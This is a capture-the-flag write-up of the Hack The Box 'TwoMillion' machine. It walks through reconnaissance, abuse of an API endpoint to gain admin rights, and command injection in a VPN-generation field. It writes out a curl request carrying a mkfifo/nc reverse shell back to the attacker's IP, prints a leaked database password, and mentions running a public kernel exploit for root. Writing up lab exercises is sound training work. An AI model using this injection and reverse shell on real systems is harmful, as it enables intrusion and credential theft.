- Link: https://app.hackthebox.com/machines/TwoMillion

## Reconnaissance
```
# Nmap 7.993 scan initiated Sat Nov 21 18:07:56 2026 as: nmap -sV -o nmap-scan.txt 10.129.187.225
Nmap scan report for 10.129.187.225
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 21 18:08:30 2026 -- 1 IP address (1 host up) scanned in 34.58 seconds

```

Nginx web redirect us to domain `2million.thb`. Need to list it in `/etc/hosts` first.

![](../Image%20Trunk/Pasted%20image%2020261121181124.png)

## Website Enumeration (gobuster)
```
home                 (Status: 302) [Size: 0] [--> /]
login                (Status: 200) [Size: 3704]
register             (Status: 200) [Size: 4527]
api                  (Status: 401) [Size: 0]
logout               (Status: 302) [Size: 0] [--> /]
404                  (Status: 200) [Size: 1674]
0404                 (Status: 200) [Size: 1674]
invite               (Status: 200) [Size: 3859]
```
## /invite
![](../Image%20Trunk/Pasted%20image%2020261121183728.png)

To register, we first need an `Invite Code`. Going directly to `/register` page also validates the Invitation Code first. Looking at my Burp Suite's proxy HTTP History, we see we sent a POST request to `/api/v1/invite/verify`. From this, I tried to enumerate the `/api/v1/invite/` path to see if maybe there is a way to generate the code.

```
Starting gobuster in directory enumeration mode
===============================================================
verify               (Status: 405) [Size: 0]
generate             (Status: 405) [Size: 0]
```

Perfect, we now have the `/generate` path that potentially generate the code without authentication. Since the enumeration was done using GET, I tried to curl it using POST method:

![](../Image%20Trunk/Pasted%20image%2020261121184121.png)

Perfect, we got our invite code. Next is to register an account using it. Not that the code was base64 encoded. So I decode it first before inputting it.

![](../Image%20Trunk/Pasted%20image%2020261121184327.png)

## Accessing VPN
In `/home/access`, we can actually get the openvpn config file for the environment.

![](../Image%20Trunk/Pasted%20image%2020261121184845.png)

## /admin
I found out that when authenticated, we can send a GET request to `/api/v1`. The response a json with list of api endpoints we can hit:

```
{
    "v1": {
        "user": {
            "GET": {
                "/api/v1": "Route List",
                "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
                "/api/v1/invite/generate": "Generate invite code",
                "/api/v1/invite/verify": "Verify invite code",
                "/api/v1/user/auth": "Check if user is authenticated",
                "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
                "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
                "/api/v1/user/vpn/download": "Download OVPN file"
            },
            "POST": {
                "/api/v1/user/register": "Register a new user",
                "/api/v1/user/login": "Login with existing user"
            }
        },
        "admin": {
            "GET": {
                "/api/v1/admin/auth": "Check if user is admin"
            },
            "POST": {
                "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
            },
            "PUT": {
                "/api/v1/admin/settings/update": "Update user settings"
            }
        }
    }
}
```

the `admin` is interesting. Trying to use PUT `/api/v1/admin/settings/update` resulted in :

```json
{"status":"danger","message":"Invalid content type."}
```

Interesting. The endpoint does not seems to check the admin privilege. I tried changing the Content-Type from `application/x-www-form-urlencoded` to `application/json`:

```json
{"status":"danger","message":"Missing parameter: email"}
```

Now, let's try our email:

```json
{"status":"danger","message":"Missing parameter: is_admin"}
```

Great. Let's try changing our `is_admin` to 1.

```json
{"id":13,"username":"jimi","is_admin":1}
```

Beautiful. To make sure, I try `/api/v1/admin/auth`:

```json
{"message":true}
```

Beautiful. We have successfully get admin access on the website. Refreshing the homepage with the newly acquired admin access does not seems to change anything.
## Admin Privilege
I then tried `/api/v1/admin/vpn/generate` with the following body:
```json
{"username":"jimi"}
```

and then we got our vpn config file. The file itself is kinda useless to me here.

Then, I tried a bash command injection in the `username` field. Here are some of the stuff I tried:
- `{"username":"jimi;sleep 2"}` -> response 2 seconds late, highly confirmed vulnerability.
- `{"username":"jimi;echo test"}` -> weirdly the response becomes `test.ovpn`.

![](../Image%20Trunk/Pasted%20image%2020261121210818.png)

- `nc -lvnp 4444` on my machine and send `{"username":"jimi;nc 10.10.15.16 4444"}` -> `Connection received on 10.129.187.225 42936` on my machine. This is huge

## RCE
Now with the RCE confirmed, I use the following curl:
```bash
curl http://2million.htb/api/v1/admin/vpn/generate -X POST -H 'Content-Type: application/json' -d '{"username":"jimi;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.15.16 4444 > /tmp/f"}' -b 'PHPSESSID=0f6ghq2mleje0qbdpb5n30j99o'
```

and this resulted in me getting the shell.

![](../Image%20Trunk/Pasted%20image%2020261121211534.png)

```shell
$ cat .env  
DB_HOST=127.0.0.1  
DB_DATABASE=htb_prod  
DB_USERNAME=admin  
DB_PASSWORD=SuperDuperPass123
```

I also got the admin credentials from the environment file. And ssh with that is valid. First flag is `/home/admin/user.txt`.

## Privilege Escalation ft. linpeas
Next, using scp, I uploaded `linpeas.sh` into admin's home directory and running it from there.

![](../Image%20Trunk/Pasted%20image%2020261121214649.png)

linpeas suggested that there is a vulnerabilities regarding `CVE-2026-80977 / CVE-2026-89487 / CVE-2026-90049`. After researching for a bit, I found out that this machine is most likely vulnerable to **Dirty Frag**.

I then grab the PoC script from https://github.com/v4bel/dirtyfrag, and upload it to admin's home directory using scp. Then, I use the exact command listed in the github repository:

![](../Image%20Trunk/Pasted%20image%2020261121214521.png)

![](../Image%20Trunk/Pasted%20image%2020261121215144.png)

Nice!